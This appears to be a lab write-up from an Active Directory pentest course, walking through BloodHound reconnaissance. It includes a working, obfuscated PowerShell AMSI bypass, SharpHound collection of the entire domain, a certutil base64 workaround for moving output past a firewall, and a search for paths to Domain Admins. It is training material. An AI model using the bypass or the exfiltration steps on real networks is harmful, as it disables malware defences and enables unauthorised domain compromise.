# Lab 0 - BloodHound

- [Lab 0 - BloodHound](#lab-0---bloodhound)
  - [Import SharpHound.ps1](#import-sharphoundps1)

----

## Import SharpHound.ps1

First bypass AMSI by using https://amsi.fail.

```
$HQIGDE=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((1125+7951));[Ref].Assembly.GetType("System.Management.Automation.$([Char](65)+[char]([BYTE]0x6D)+[cHAR]([byTE]0x73)+[cHAr](105))Utils").GetField("$([ChAr](97)+[CHaR]([ByTe]0x6D)+[CHAR](177-62)+[ChaR](105))Session", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([Char](65)+[char]([BYTE]0x6D)+[cHAR]([byTE]0x73)+[cHAr](105))Utils").GetField("$([ChAr](97)+[CHaR]([ByTe]0x6D)+[CHAR](177-62)+[ChaR](105))Context", "NonPublic,Static").SetValue($null, [IntPtr]$HQIGDE);
```

<br/>

Then import `SharpHound.ps1`:

```
cd C:\AD\Tools\BloodHound-master\Ingestors && . .\SharpHound.ps1
```

Run the collection script:

```
Invoke-BloodHound -CollectionMethod All -ExcludeDomainControllers
```

![picture 6](images/020a27a29550314000af6f115ce805404373179764d9b3ff22788575b5e7232d.png)  

<br/>

Upload the output file to the attacker machine. First on the attacker machine, use https://gist.github.com/brianyaucy/5b4e49171a3e913f9382d4cd1cb204e1 to prepare a Python HTTP Server with Upload:

```
PythonHTTPServerWithUpload.py 80
```

However, it looks like firewall is blocking the traffic:

![picture 7](images/63824891fd0afcf3e0b0862e5a0b71b0262bd8975011ce1a7886cc817c0475e9.png)  

<br/>

Instead, use base64 to encode the output file first:

```
certutil -encode .\20210120045733_BloodHound.zip bh.txt
```

![picture 8](images/f24118716ac264844ac56253a75e195e717c1b1c5ae895b919105887b33129d5.png)  

<br/>

Trim the first and the last line of the output, and then copy the words into a new file (`bh.txt`) in the attacker machine. After that, decode the base64 string and output as a ZIP file:

```
cat bh.txt | base64 --decode > bh_result.zip
```

![picture 9](images/1356cc116338ab11deb67fe0a44e99c9d00efe583e2f15b7f15f33466a0f1cda.png)  

<br/>

Start `Neo4j`:

```
neo4j start
```

Then start `bloodhound`:

```
bloodhound
```

<br/>

Use the upload function to upload the zip file:

![picture 10](images/3b5f85bff805887418ed665da2fa033cf4e2106b75414085fc8ac9c4bcc80643.png)  

<br/>

Use the Pre-Built Analytics query `Find Shortest Paths to Domain Admins` to see the path:

![picture 11](images/e2cf487b0f4cb4293df24d66777aa6f46a6f2eebfb6f3fb9ec098c91347065f5.png)  

<br/>

